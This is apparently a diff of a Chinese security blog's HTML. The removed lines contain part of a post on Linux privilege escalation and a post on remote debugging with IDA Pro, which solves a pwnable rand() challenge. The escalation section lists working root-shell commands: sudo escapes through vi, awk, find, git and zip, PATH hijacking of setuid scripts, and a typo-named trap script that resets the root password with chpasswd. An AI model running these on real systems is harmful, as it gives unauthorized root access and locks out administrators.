-<p>使用如下命令即可复现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/test</span><br><span class="line">echo &quot;bin/bash&quot; &gt; sudotest.sh</span><br><span class="line">chmod +x sudotest.sh</span><br><span class="line">sudo ./sudotest.sh</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo03.png" alt=""></p>
-<h3 id="2-2-sudoers文件中配置的文件夹"><a href="#2-2-sudoers文件中配置的文件夹" class="headerlink" title="2.2 sudoers文件中配置的文件夹"></a>2.2 sudoers文件中配置的文件夹</h3><p>/etc/sudoers中配置的sudo文件夹低权限用户是否具有写权限，具有写权限，则可进行sudo提权。</p>
-<p>在之前的配置中我们可以看到，在/home/test/sudo这个test用户可控目录以test随意创建脚本使用sudo执行均是免root密码的。</p>
-<p>使用如下命令即可复现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/test/sudo</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; test.sh</span><br><span class="line">chmod +x test.sh</span><br><span class="line">sudo ./test.sh</span><br></pre></td></tr></table></figure></p>
-<h3 id="2-3-使用系统命令sudo提权"><a href="#2-3-使用系统命令sudo提权" class="headerlink" title="2.3 使用系统命令sudo提权"></a>2.3 使用系统命令sudo提权</h3><p>如vi，more，less，tar，zip，awk，git，find等命令，如在/etc/sudoers中配置，即存在sudo提权</p>
-<p>vi,more,less的命令sudo提权方式都是使用对应命令sudo打开一个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi filename</span><br><span class="line">sudo more filename</span><br><span class="line">sudo less filename</span><br></pre></td></tr></table></figure></p>
-<p>然后在打开界面输入!/bin/bash，即可获得root权限的shell</p>
-<p>zip命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip filename.zip 123.txt -T --unzip-command=&quot;!/bin/bash&quot;</span><br></pre></td></tr></table></figure></p>
-<p>awk命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure></p>
-<p>git命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help status</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure></p>
-<p>find命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /bin/ -name ls -exec /bin/bash \;</span><br></pre></td></tr></table></figure></p>
-<h2 id="3-环境变量提权"><a href="#3-环境变量提权" class="headerlink" title="3. 环境变量提权"></a>3. 环境变量提权</h2><h3 id="3-1-具有S权限位的脚本"><a href="#3-1-具有S权限位的脚本" class="headerlink" title="3.1 具有S权限位的脚本"></a>3.1 具有S权限位的脚本</h3><p>Linux中通过设置suid，可以让程序的执行者临时拥有属主的权限，可以使用下面的命令查找具有suid的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
-<p>然后具有s权限位的这些脚本中如果存在可控环境变量。如脚本中存在调用ps程序，我们可以在低权限用户可写目录中写一个ps文件，内容为/bin/bash，然后将此目录添加到环境变量最优先寻找的目录，再执行脚本，脚本就会以root权限触发/bin/bash，就产生了一个root权限的shell，完成提权。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /home/test/ps</span><br><span class="line">export PATH=/home/test:$PATH</span><br></pre></td></tr></table></figure></p>
-<h3 id="3-2-root的环境变量设置了用户可控目录"><a href="#3-2-root的环境变量设置了用户可控目录" class="headerlink" title="3.2 root的环境变量设置了用户可控目录"></a>3.2 root的环境变量设置了用户可控目录</h3><p>root的$PATH若设置了用户可控的目录，用户可以在此可控目录写入一些命令并诱导root用户输入，在这些文件中填充修改root密码的命令或给其他用户添加权限等命令，然后当root用户被诱导输入一些环境变量中配置的指令时就会执行这些命令。通常会配置一些容易输错的单词，并在后面加入返回命令不存在的提示。</p>
-<p>如文件名设置为whomai，与正常的命令whoami颠倒了一点顺序，有时手快会输入错误。<br>然后在whoami中配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:password&quot; |chpasswd &gt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line">echo &quot;bash: whomai: 未找到命令&quot;</span><br></pre></td></tr></table></figure></p>
-<p>当然我们可以配置非常多的文件名来增加触发概率。</p>
-<h3 id="3-3-su切换而不是su-切换导致携带用户环境变量"><a href="#3-3-su切换而不是su-切换导致携带用户环境变量" class="headerlink" title="3.3 su切换而不是su -切换导致携带用户环境变量"></a>3.3 su切换而不是su -切换导致携带用户环境变量</h3><p>linux系统在使用su切换时，会携带当前用户的环境变量，使用su -则不会，如果在当前用户环境变量设置如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/home/test/ps:$PATH</span><br></pre></td></tr></table></figure></p>
-<p>编辑一个ps文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:password&quot; |chpasswd &gt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line">ps</span><br></pre></td></tr></table></figure></p>
-<p>那么在从此用户切换到root的管理员，在使用ps时就会修改掉root用户密码。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/04/ida远程调试linux程序/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/04/ida远程调试linux程序/" itemprop="url">
-                  ida远程调试linux程序
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-04T00:26:16+08:00">
-                2020-02-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ida/" itemprop="url" rel="index">
-                    <span itemprop="name">ida</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/04/ida远程调试linux程序/" class="leancloud_visitors" data-flag-title="ida远程调试linux程序">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在分析二进制程序时，经常需要借助动态调试的方法，在linux中我们通常使用gdb来进行动态调试，但是gdb使用方法较复杂，对新手不友好，而ida具有很好的图形化界面，使用ida对linux程序进行远程动态调试在这种情况下是一种不错的选择。</p>
-<h2 id="ida远程调试配置"><a href="#ida远程调试配置" class="headerlink" title="ida远程调试配置"></a>ida远程调试配置</h2><p>1.要配置ida远程调试，首先需要将ida安装目录dbgsrv中的linux_server、linux_server64（根据所调试程序是32还是64位）拷贝至linux机器中。赋予其可执行权限，并运行对应版本的linux_server。</p>
-<p>2.将需要调试程序拷贝两份，一份放在linux中，赋予其others可执行权限（sudo chmod o+x xxx），另一份放在windows中，使用ida打开，并选择在上方菜单栏选择Debuger-&gt;Run-&gt;Remote Linux Debugger。</p>
-<p>3.在Debugger-&gt;process options中配置远程linux机器ip，端口，运行文件路径，以及运行参数等。点击ok，ida自动载入远程程序，ida远程调试的配置就完成了。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida01.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida02.png" alt=""></p>
-<h2 id="ida远程调试"><a href="#ida远程调试" class="headerlink" title="ida远程调试"></a>ida远程调试</h2><p>在本文中使用一道pwnable中的简单题目来讲解ida远程调试,先贴题目代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        unsigned int random;</span><br><span class="line">        random = rand();        // random value!</span><br><span class="line"></span><br><span class="line">        unsigned int key=0;</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line"></span><br><span class="line">        if( (key ^ random) == 0xdeadbeef )&#123;</span><br><span class="line">                printf(&quot;Good!\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>本题原意是考察c语言中rand()函数在不使用随机数种子的情况下，默认使用1作为种子，导致每次产生的随机数均为同样的值，只需要将代码重新编译运行print出随机数即可，或者动态调试时候直接查看内存中随机数的值，此处为了介绍ida远程调试，就使用第二种办法。</p>
-<p>1.首先我们在刚才的程序中，找到主函数，F5反编译伪代码，F2设置断点，并启动远程调试。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida03.png" alt=""></p>
-<p>2.打开debugger-&gt;debugger windows-&gt;watch view监视窗口，添加新变量v5进行观察，或者直接在汇编中，添加eax查看调用rand函数之后的值。</p>
-<p>3.F8单步调试，F9单步进入函数，多次按下F8在rand()之后查看v5或rand之后eax的值，计算和0xdeadbeef的异或就是需要输入的key值。在这里得到，随机数为0x6B8B4567，则计算得到key为0xb526fb88，由于需要输入%d格式的key，所以转换成十进制为3039230856。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida04.png" alt=""></p>
-<p>4.linux中输入计算值，进入分支，获取flag。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ida_debug/ida05.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2332,7 +2289,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">111</span>
+                <span class="site-state-item-count">115</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2343,7 +2300,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-count">22</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2354,7 +2311,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">64</span>
+                <span class="site-state-item-count">68</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
